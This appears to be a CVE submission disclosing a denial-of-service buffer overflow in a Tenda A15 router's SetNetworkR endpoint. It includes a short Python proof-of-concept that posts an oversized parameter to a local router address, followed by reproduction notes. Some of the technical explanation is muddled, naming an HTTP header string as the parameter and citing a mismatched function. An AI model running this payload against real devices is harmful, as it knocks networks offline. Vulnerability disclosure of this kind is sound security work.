# CVE submission
Affected products and versions: Tenda A15 V15.13.07.13

Affected object type: Network device (router)

Vulnerability type: buffer overflow

Vulnerability URL: http://xxx/goform/SetNetworkR

Vulnerability description: Tengda router A15 V15.13.07.13 has a buffer overflow vulnerability, which can be exploited by an attacker to cause a denial of service.

Vulnerability Analysis Process:
Router Firmware Download:https://www.tendacn.com/download/detail-3187.html
![alt text](image.png)

The vulnerability occurs in the formSetNetworkR function
![alt text](image-1.png)
The program obtains the parameter "HTTP/1.1 200 OKrnContent-Length:%drnContent-type: text/plain; charset=utf-8rnPrag ma: no-cachernCache-Control: no-cachernrn", and then pass the user's input into the websDone function, which will handle the characters entered by the user, and if the input value is too large, it will not be processed.

![alt text](image-2.png)
Cross-locate the formArpNerworkSet function route to SetNetworkR

Attack payloads：
import requests

url = "http://192.168.85.160/goform/SetNetworkR"
data = {
    "HTTP/1.1 200 OK\r\nContent-Length:%d\r\nContent-type: text/plain; charset=utf-8\r\nPrag ma: no-cache\r\nCache-Control: no-cache\r\n\r\n":b'A'*1000000000
}
res = requests.post(url=url,data=data)
print(res.content)

Repetition：
![alt text](image-3.png)
![alt text](image-4.png)
Run the script
![alt text](image-5.png)
CPU occupancy
![alt text](image-6.png)
The router crashes, the website cannot be accessed, and the access denial attack succeeds

Vulnerability reproduction video:
Link: https://pan.baidu.com/s/1HX0p1F342ZmpUZNdoWCkyw 
Extraction code: rjvp
